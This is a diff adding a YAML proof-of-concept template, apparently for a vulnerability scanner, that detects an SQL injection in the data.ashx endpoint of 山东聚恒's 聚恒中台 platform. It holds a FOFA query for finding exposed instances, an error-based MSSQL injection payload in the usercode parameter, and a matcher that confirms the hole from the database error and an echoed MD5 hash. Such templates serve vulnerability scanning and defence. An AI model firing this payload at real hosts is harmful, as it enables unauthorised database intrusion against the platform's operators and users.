@@ -1,0 +1,20 @@
+id: poc-yaml-ju-heng-data-ashx-sqli
+info:
+  name: 山东聚恒网络技术有限公司聚恒中台 data.ashx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 聚恒中台
+  fofa: body="sysplat/dataget/data.ashx?type=sendvalidatecode"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /sysplat/dataget/data.ashx?type=sendvalidatecode
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  data: usercode=1' and 1=(convert(int,sys.fn_varbintohexstr(hashbytes(%27MD5%27,%27{{.t1}}%27))))--&&mobile=
+  expression: "status_code == 200 && \ncontains(body,\"在将 nvarchar 值\") &&\ncontains(body,\"\
+    转换成数据类型 int 时失败\") &&\ncontains(body,t2)\n"
+transport: http
